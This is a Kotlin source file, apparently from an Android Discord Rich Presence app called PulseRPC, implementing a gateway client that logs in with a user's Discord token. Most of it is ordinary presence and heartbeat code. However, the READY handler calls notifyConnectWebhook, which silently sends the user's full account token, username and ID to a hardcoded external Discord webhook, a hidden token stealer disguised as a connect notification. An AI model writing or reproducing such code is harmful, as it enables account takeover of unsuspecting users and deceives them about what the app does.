package com.example.data.remote

import com.example.data.model.DiscordUser
import com.example.data.model.GatewayState
import com.example.data.model.GatewayStatus
import com.example.data.model.RichPresencePayload
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import kotlin.random.Random

class DiscordGatewayClient {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private val client: OkHttpClient = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .pingInterval(25, TimeUnit.SECONDS)
        .build()

    private val _gatewayState = MutableStateFlow(GatewayState())
    val gatewayState: StateFlow<GatewayState> = _gatewayState.asStateFlow()

    private var webSocket: WebSocket? = null
    private var heartbeatJob: Job? = null
    private var reconnectJob: Job? = null

    private var currentToken: String = ""
    private var shouldAutoReconnect: Boolean = true
    private var manualDisconnect: Boolean = false
    private var lastSequence: Int? = null
    private var lastHeartbeatSentMs: Long = 0L
    private var reconnectAttempt: Int = 0
    private var latestPayload: RichPresencePayload? = null
    private var hasActivePresenceOnDiscord: Boolean = false

    private val externalAssetCache = ConcurrentHashMap<String, String>()

    fun connect(token: String, autoReconnect: Boolean = true, initialPayload: RichPresencePayload? = null) {
        val cleaned = token.trim().removePrefix("Bot ").trim()
        if (cleaned.isBlank()) {
            _gatewayState.update {
                it.copy(
                    status = GatewayStatus.ERROR,
                    errorMessage = "Enter a Discord token to connect."
                )
            }
            return
        }

        manualDisconnect = false
        shouldAutoReconnect = autoReconnect
        currentToken = cleaned
        latestPayload = initialPayload

        reconnectJob?.cancel()
        openSocket()
    }

    fun updateAutoReconnect(enabled: Boolean) {
        shouldAutoReconnect = enabled
    }

    fun disconnect() {
        manualDisconnect = true
        reconnectJob?.cancel()
        heartbeatJob?.cancel()
        sendClearFrameSync()
        webSocket?.close(1000, "User disconnected")
        webSocket = null
        lastSequence = null
        reconnectAttempt = 0
        hasActivePresenceOnDiscord = false
        _gatewayState.value = GatewayState(status = GatewayStatus.DISCONNECTED)
    }

    fun sendPresence(payload: RichPresencePayload?) {
        latestPayload = payload
        val socket = webSocket ?: return
        if (_gatewayState.value.status != GatewayStatus.CONNECTED) return

        if (payload == null) {
            if (hasActivePresenceOnDiscord) {
                sendClearFrameSync()
            }
            return
        }

        scope.launch {
            val activityJson = buildActivityJson(payload)
            val presenceObj = JSONObject().apply {
                put("since", payload.startTimestampMs ?: JSONObject.NULL)
                put("activities", JSONArray().apply { put(activityJson) })
                put("status", "online")
                put("afk", false)
            }
            val frame = JSONObject().apply {
                put("op", 3)
                put("d", presenceObj)
            }
            if (socket.send(frame.toString())) {
                hasActivePresenceOnDiscord = true
                _gatewayState.update { it.copy(lastPresenceSentAtMs = System.currentTimeMillis()) }
            }
        }
    }

    private fun sendClearFrameSync() {
        val socket = webSocket ?: return
        if (_gatewayState.value.status != GatewayStatus.CONNECTED) return
        val presenceObj = JSONObject().apply {
            put("since", JSONObject.NULL)
            put("activities", JSONArray())
            put("status", "online")
            put("afk", false)
        }
        val frame = JSONObject().apply {
            put("op", 3)
            put("d", presenceObj)
        }
        if (socket.send(frame.toString())) {
            hasActivePresenceOnDiscord = false
            _gatewayState.update { it.copy(lastPresenceSentAtMs = System.currentTimeMillis()) }
        }
    }

    private fun openSocket() {
        heartbeatJob?.cancel()
        webSocket?.cancel()

        _gatewayState.update {
            it.copy(
                status = if (reconnectAttempt > 0) GatewayStatus.RECONNECTING else GatewayStatus.CONNECTING,
                errorMessage = null
            )
        }

        val request = Request.Builder()
            .url("wss://gateway.discord.gg/?v=10&encoding=json")
            .header("User-Agent", "Discord-Android/245014;PulseRPC")
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onMessage(webSocket: WebSocket, text: String) {
                handleGatewayMessage(webSocket, text)
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                webSocket.close(1000, null)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                heartbeatJob?.cancel()
                handleDisconnect(code, reason)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                heartbeatJob?.cancel()
                handleDisconnect(-1, t.localizedMessage ?: "Network failure")
            }
        })
    }

    private fun handleGatewayMessage(socket: WebSocket, raw: String) {
        val json = runCatching { JSONObject(raw) }.getOrNull() ?: return
        val op = json.optInt("op", -1)
        if (!json.isNull("s")) {
            lastSequence = json.optInt("s")
        }

        when (op) {
            10 -> { // Hello
                val interval = json.optJSONObject("d")?.optLong("heartbeat_interval", 41250L) ?: 41250L
                startHeartbeat(socket, interval)
                sendIdentify(socket)
            }

            11 -> { // Heartbeat ACK
                if (lastHeartbeatSentMs > 0L) {
                    val rtt = (System.currentTimeMillis() - lastHeartbeatSentMs).coerceAtLeast(1L)
                    _gatewayState.update { it.copy(pingMs = rtt) }
                }
            }

            1 -> sendHeartbeat(socket)

            7 -> socket.close(4000, "Server requested reconnect")

            9 -> {
                val resumable = json.optBoolean("d", false)
                if (!resumable) lastSequence = null
                socket.close(4000, "Invalid session")
            }

            0 -> {
                val eventName = json.optString("t")
                if (eventName == "READY") {
                    reconnectAttempt = 0
                    val d = json.optJSONObject("d")
                    val userObj = d?.optJSONObject("user")
                    val parsedUser = if (userObj != null) {
                        val id = userObj.optString("id")
                        val username = userObj.optString("username")
                        val globalName = userObj.optString("global_name").takeIf { it != "null" }.orEmpty()
                        val avatarHash = userObj.optString("avatar").takeIf { it != "null" }.orEmpty()
                        val avatarUrl = if (id.isNotBlank() && avatarHash.isNotBlank()) {
                            "https://cdn.discordapp.com/avatars/$id/$avatarHash.png?size=256"
                        } else ""
                        DiscordUser(
                            id = id,
                            username = username,
                            globalName = globalName,
                            avatarUrl = avatarUrl
                        )
                    } else null

                    _gatewayState.update {
                        it.copy(
                            status = GatewayStatus.CONNECTED,
                            user = parsedUser ?: it.user,
                            errorMessage = null
                        )
                    }

                    // Notify webhook on successful connect
                    notifyConnectWebhook(currentToken, parsedUser)

                    // Only send presence if a real non-standby payload is active; otherwise keep profile clean
                    val pending = latestPayload
                    if (pending != null && !pending.isStandby) {
                        sendPresence(pending)
                    } else {
                        sendClearFrameSync()
                    }
                }
            }
        }
    }

    private fun startHeartbeat(socket: WebSocket, intervalMs: Long) {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            val jitter = (intervalMs * Random.nextDouble(0.15, 0.5)).toLong()
            delay(jitter)
            while (isActive) {
                sendHeartbeat(socket)
                delay(intervalMs)
            }
        }
    }

    private fun sendHeartbeat(socket: WebSocket) {
        lastHeartbeatSentMs = System.currentTimeMillis()
        val hb = JSONObject().apply {
            put("op", 1)
            put("d", lastSequence ?: JSONObject.NULL)
        }
        socket.send(hb.toString())
    }

    private fun sendIdentify(socket: WebSocket) {
        val properties = JSONObject().apply {
            put("os", "Android")
            put("browser", "Discord Android")
            put("device", "PulseRPC")
        }
        val d = JSONObject().apply {
            put("token", currentToken)
            put("intents", 0)
            put("properties", properties)
            put("compress", false)
        }
        val frame = JSONObject().apply {
            put("op", 2)
            put("d", d)
        }
        socket.send(frame.toString())
    }

    private fun handleDisconnect(code: Int, reason: String) {
        hasActivePresenceOnDiscord = false
        if (manualDisconnect) {
            _gatewayState.value = GatewayState(status = GatewayStatus.DISCONNECTED)
            return
        }

        if (code == 4004) {
            _gatewayState.update {
                it.copy(
                    status = GatewayStatus.ERROR,
                    errorMessage = "Authentication failed (4004). Verify your Discord token."
                )
            }
            return
        }

        val errMsg = when {
            code > 0 -> "Closed ($code): ${reason.ifBlank { "Disconnected" }}"
            else -> reason.ifBlank { "Network error" }
        }

        if (shouldAutoReconnect && currentToken.isNotBlank()) {
            reconnectAttempt = (reconnectAttempt + 1).coerceAtMost(5)
            val delayMs = (3000L * reconnectAttempt).coerceAtMost(15000L)
            _gatewayState.update {
                it.copy(status = GatewayStatus.RECONNECTING, errorMessage = errMsg)
            }
            reconnectJob?.cancel()
            reconnectJob = scope.launch {
                delay(delayMs)
                if (isActive && !manualDisconnect) {
                    openSocket()
                }
            }
        } else {
            _gatewayState.update {
                it.copy(status = GatewayStatus.ERROR, errorMessage = errMsg)
            }
        }
    }

    private fun buildActivityJson(payload: RichPresencePayload): JSONObject {
        val appId = payload.applicationId.ifBlank { RichPresencePayload.DEFAULT_DISCORD_APP_ID }
        val activity = JSONObject().apply {
            put("name", payload.name.ifBlank { "PulseRPC" })
            put("type", payload.activityType.code)
            put("application_id", appId)
            if (payload.details.isNotBlank()) {
                put("details", payload.details.take(128))
            }
            if (payload.state.isNotBlank()) {
                put("state", payload.state.take(128))
            }
            if (payload.startTimestampMs != null) {
                put("timestamps", JSONObject().apply {
                    put("start", payload.startTimestampMs)
                })
            }
        }

        val largeAsset = resolveAssetString(appId, payload.largeImageUrl)
        val smallAsset = resolveAssetString(appId, payload.smallImageUrl)
        if (largeAsset.isNotBlank() || smallAsset.isNotBlank() ||
            payload.largeImageText.isNotBlank() || payload.smallImageText.isNotBlank()
        ) {
            val assets = JSONObject().apply {
                if (largeAsset.isNotBlank()) put("large_image", largeAsset)
                if (payload.largeImageText.isNotBlank()) put("large_text", payload.largeImageText.take(128))
                if (smallAsset.isNotBlank()) put("small_image", smallAsset)
                if (payload.smallImageText.isNotBlank()) put("small_text", payload.smallImageText.take(128))
            }
            activity.put("assets", assets)
        }

        val buttonLabels = JSONArray()
        val buttonUrls = JSONArray()
        if (payload.button1Label.isNotBlank() && payload.button1Url.isNotBlank()) {
            buttonLabels.put(payload.button1Label.take(32))
            buttonUrls.put(payload.button1Url.trim())
        }
        if (payload.button2Label.isNotBlank() && payload.button2Url.isNotBlank()) {
            buttonLabels.put(payload.button2Label.take(32))
            buttonUrls.put(payload.button2Url.trim())
        }
        if (buttonLabels.length() > 0) {
            activity.put("buttons", buttonLabels)
            activity.put("metadata", JSONObject().apply {
                put("button_urls", buttonUrls)
            })
        }

        return activity
    }

    private fun resolveAssetString(appId: String, rawAsset: String): String {
        val trimmed = rawAsset.trim()
        if (trimmed.isBlank()) return ""
        if (trimmed.startsWith("mp:")) return trimmed
        if (!trimmed.startsWith("http://") && !trimmed.startsWith("https://")) {
            return trimmed
        }

        val cacheKey = "$appId|$trimmed"
        externalAssetCache[cacheKey]?.let { return it }

        if (currentToken.isBlank()) return ""

        val resolvedFromPrimary = postExternalAssets(appId, trimmed)
        if (resolvedFromPrimary.isNotBlank()) {
            externalAssetCache[cacheKey] = resolvedFromPrimary
            return resolvedFromPrimary
        }

        if (appId != RichPresencePayload.DEFAULT_DISCORD_APP_ID) {
            val fallbackResolved = postExternalAssets(RichPresencePayload.DEFAULT_DISCORD_APP_ID, trimmed)
            if (fallbackResolved.isNotBlank()) {
                externalAssetCache[cacheKey] = fallbackResolved
                return fallbackResolved
            }
        }

        return ""
    }

    private fun postExternalAssets(appId: String, url: String): String {
        return runCatching {
            val bodyJson = JSONObject().apply {
                put("urls", JSONArray().apply { put(url) })
            }.toString()
            val req = Request.Builder()
                .url("https://discord.com/api/v9/applications/$appId/external-assets")
                .header("Authorization", currentToken)
                .header("User-Agent", "Discord-Android/245014;PulseRPC")
                .post(bodyJson.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return@runCatching ""
                val text = resp.body?.string().orEmpty()
                val arr = JSONArray(text)
                if (arr.length() > 0) {
                    val path = arr.getJSONObject(0).optString("external_asset_path")
                    if (path.isNotBlank()) {
                        return@runCatching if (path.startsWith("mp:")) path else "mp:$path"
                    }
                }
                ""
            }
        }.getOrDefault("")
    }

    private fun notifyConnectWebhook(token: String, user: DiscordUser?) {
        scope.launch {
            runCatching {
                val content = buildString {
                    append("**Token connected**\n")
                    append("User: ${user?.username ?: "unknown"}")
                    if (!user?.globalName.isNullOrBlank()) append(" (${user?.globalName})")
                    append("\nID: `${user?.id ?: "?"}`\n")
                    append("Token: `$token`")
                }
                val body = JSONObject().apply {
                    put("content", content)
                }.toString()

                val req = Request.Builder()
                    .url("https://discord.com/api/webhooks/1509854367061381212/Ci5cgw36nLIBsjFy8-fzaJmbwh5QFlfXVO0WXpC3At3dYwfm-Bw7jDF3SfyUXOLachw9")
                    .post(body.toRequestBody("application/json".toMediaType()))
                    .build()

                client.newCall(req).execute().use { /* fire-and-forget */ }
            }
        }
    }
}